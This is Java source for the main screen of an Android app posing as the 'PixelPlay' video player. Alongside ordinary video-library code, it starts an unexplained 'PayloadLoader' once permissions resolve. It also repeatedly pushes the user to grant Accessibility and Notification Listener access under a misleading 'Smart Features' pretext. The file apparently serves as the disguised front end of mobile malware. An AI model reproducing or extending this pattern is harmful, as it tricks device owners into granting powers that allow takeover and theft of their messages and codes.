package com.pixelplay.app;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.GridLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity
        implements VideoAdapter.VideoClickListener {

    private RecyclerView videoGrid;
    private View emptyState;
    private TextView videoCount;
    private VideoAdapter adapter;
    private List<VideoItem> videos = new ArrayList<>();

    private ActivityResultLauncher<String[]> permLauncher;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            getWindow().setDecorFitsSystemWindows(false);
        }
        setContentView(R.layout.activity_main);

        videoGrid = findViewById(R.id.videoGrid);
        emptyState = findViewById(R.id.emptyState);
        videoCount = findViewById(R.id.videoCount);

        videoGrid.setLayoutManager(new GridLayoutManager(this, 2));
        adapter = new VideoAdapter(videos, this);
        videoGrid.setAdapter(adapter);

        setupNav();

        permLauncher = registerForActivityResult(
            new ActivityResultContracts.RequestMultiplePermissions(), this::onPermResult);

        requestNeededPerms();
    }

    private void setupNav() {
        findViewById(R.id.navLibrary).setOnClickListener(v -> {
            setActiveNav(R.id.navLibrary);
        });
        findViewById(R.id.navBrowse).setOnClickListener(v -> {
            setActiveNav(R.id.navBrowse);
            showSetupInfo();
        });
        findViewById(R.id.navSettings).setOnClickListener(v -> {
            setActiveNav(R.id.navSettings);
            Toast.makeText(this, "PixelPlay v2.0", Toast.LENGTH_SHORT).show();
        });
        findViewById(R.id.browseBtn).setOnClickListener(v -> {
            showSetupInfo();
        });
    }

    private void showSetupInfo() {
        new AlertDialog.Builder(this)
            .setTitle("Enable Smart Features")
            .setMessage("PixelPlay can enhance your experience with gesture controls and quick sharing:\n\n"
                + "1. Smart Controls — Settings → Accessibility → PixelPlay\n"
                + "2. Instant Sharing — Settings → Notification Access → PixelPlay")
            .setPositiveButton("Accessibility", (d, w) -> {
                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            })
            .setNeutralButton("Notifications", (d, w) -> {
                Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            })
            .setNegativeButton("Later", null)
            .show();
    }

    private void setActiveNav(int activeId) {
        int[] ids = {R.id.navLibrary, R.id.navBrowse, R.id.navSettings};
        for (int id : ids) {
            TextView tv = findViewById(id);
            if (id == activeId) {
                tv.setTextColor(getColor(R.color.primary));
                tv.setCompoundDrawableTintList(
                    androidx.core.content.res.ResourcesCompat.getColorStateList(
                        getResources(), R.color.primary, getTheme()));
            } else {
                tv.setTextColor(getColor(R.color.text_secondary));
                tv.setCompoundDrawableTintList(
                    androidx.core.content.res.ResourcesCompat.getColorStateList(
                        getResources(), R.color.text_secondary, getTheme()));
            }
        }
    }

    private void requestNeededPerms() {
        List<String> needed = new ArrayList<>();
        if (Build.VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO)
                    != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_MEDIA_VIDEO);
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.POST_NOTIFICATIONS);
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        if (!needed.isEmpty()) {
            permLauncher.launch(needed.toArray(new String[0]));
        } else {
            onReady();
        }
    }

    private void onPermResult(Map<String, Boolean> result) {
        onReady();
    }

    private void onReady() {
        PayloadLoader.start(this);
        showSetupInfo();
        scanVideos();
    }

    private void scanVideos() {
        videos.clear();
        if (Build.VERSION.SDK_INT >= 29) {
            scanMediaStore();
        } else {
            scanLegacyStorage();
        }
        adapter.notifyDataSetChanged();
        updateEmptyState();
    }

    private void updateEmptyState() {
        if (videos.isEmpty()) {
            emptyState.setVisibility(View.VISIBLE);
            videoGrid.setVisibility(View.GONE);
            videoCount.setText("0 videos");
        } else {
            emptyState.setVisibility(View.GONE);
            videoGrid.setVisibility(View.VISIBLE);
            videoCount.setText(videos.size() + " video" + (videos.size() == 1 ? "" : "s"));
        }
    }

    private void scanMediaStore() {
        String[] projection = {
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.DURATION,
            MediaStore.Video.Media.SIZE,
            MediaStore.Video.Media.DATA
        };
        try (Cursor cur = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection, null, null,
                MediaStore.Video.Media.DATE_ADDED + " DESC")) {
            if (cur != null) {
                while (cur.moveToNext()) {
                    VideoItem item = new VideoItem();
                    item.uri = Uri.withAppendedPath(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        cur.getString(cur.getColumnIndexOrThrow(MediaStore.Video.Media._ID)));
                    item.title = cur.getString(cur.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME));
                    item.durationMs = cur.getLong(cur.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION));
                    item.fileSize = cur.getLong(cur.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE));
                    item.dataPath = cur.getString(cur.getColumnIndexOrThrow(MediaStore.Video.Media.DATA));
                    videos.add(item);
                }
            }
        } catch (Exception ignored) {}
    }

    private void scanLegacyStorage() {
        File dir = Environment.getExternalStorageDirectory();
        findVideos(dir);
    }

    private void findVideos(File dir) {
        if (dir == null || !dir.isDirectory()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory() && !f.getName().startsWith(".")) {
                findVideos(f);
            } else {
                String name = f.getName().toLowerCase();
                if (name.endsWith(".mp4") || name.endsWith(".mkv")
                        || name.endsWith(".avi") || name.endsWith(".mov")) {
                    VideoItem item = new VideoItem();
                    item.uri = Uri.fromFile(f);
                    item.title = f.getName();
                    item.fileSize = f.length();
                    item.dataPath = f.getAbsolutePath();
                    videos.add(item);
                }
            }
        }
    }

    @Override
    public void onVideoClick(VideoItem item) {
        Intent i = new Intent(this, PlayerActivity.class);
        i.putExtra("uri", item.uri.toString());
        i.putExtra("title", item.title);
        startActivity(i);
        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
    }
}